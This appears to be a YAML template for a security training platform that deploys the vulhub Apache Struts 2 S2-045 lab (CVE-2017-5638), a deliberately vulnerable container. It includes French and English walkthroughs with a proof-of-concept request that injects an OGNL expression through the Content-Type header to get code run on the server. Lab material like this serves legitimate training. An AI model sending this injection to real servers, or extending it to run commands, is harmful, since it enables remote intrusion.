apiVersion: hivora/v1
kind: Template
metadata:
  slug: vulhub-struts2-s2-045
  name: Apache Struts 2
  version: 1.1.0
  category: security-lab
  tags:
  - vulhub
  - apache-struts2
  description: S2-045 Remote Code Execution (vulhub).
  links:
    site: https://github.com/vulhub/vulhub/tree/master/struts2/s2-045
  maintainer: vulhub
  license: MIT (vulhub)
  source: https://github.com/vulhub/vulhub/tree/master/struts2/s2-045
  lab:
    phase: exploitation
    cves:
    - CVE-2017-5638
    os:
    - linux
    tech:
    - framework
    - rce
    summary:
      fr: Exécution de code à distance
      en: Remote code execution
    solution:
      fr: |
        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/struts2/s2-045
        Affected Version: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
        References:
        - http://struts.apache.org/docs/s2-045.html
        - https://nsfocusglobal.com/apache-struts2-remote-code-execution-vulnerability-s2-045/
        # Setup
        Execute the following command to start the Struts2 2.3.30：
        $ docker compose up -d
        After the container is running, visit `http://your-ip:8080` that you can see an example of the upload page.
        # Exploitation
        Verify the vulnerability by following request:
        $ POST / HTTP/1.1
        $ Host: localhost:8080
        $ Upgrade-Insecure-Requests: 1
        $ User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
        $ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        $ Accept-Language: en-US,en;q=0.8,es;q=0.6
        $ Connection: close
        $ Content-Length: 0
        $ Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
        `233*233` has been successfully executed:
      en: |
        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/struts2/s2-045
        Affected Version: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
        References:
        - http://struts.apache.org/docs/s2-045.html
        - https://nsfocusglobal.com/apache-struts2-remote-code-execution-vulnerability-s2-045/
        # Setup
        Execute the following command to start the Struts2 2.3.30：
        $ docker compose up -d
        After the container is running, visit `http://your-ip:8080` that you can see an example of the upload page.
        # Exploitation
        Verify the vulnerability by following request:
        $ POST / HTTP/1.1
        $ Host: localhost:8080
        $ Upgrade-Insecure-Requests: 1
        $ User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
        $ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        $ Accept-Language: en-US,en;q=0.8,es;q=0.6
        $ Connection: close
        $ Content-Length: 0
        $ Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
        `233*233` has been successfully executed:
requirements:
  arch:
  - amd64
form:
  basic:
  - id: port_8080
    group:
      fr: Accès
      en: Access
    label: struts2 8080/tcp
    type: port
    default: 8080
services:
  struts2:
    role: main
    image: vulhub/struts2
    tag: 2.3.30@sha256:b992e080d8e5ad332bf526ae26124d28f56ca4fc9e0eaa91510dbee9870eb2c8
    frozen: true
    ports:
    - container: 8080
      host: '{{ form.port_8080 }}'
      protocol: tcp
      purpose: web
      exposure: lan
update:
  strategy: manual
access:
  web: http://{{ host.lan_ip }}:{{ form.port_8080 }}
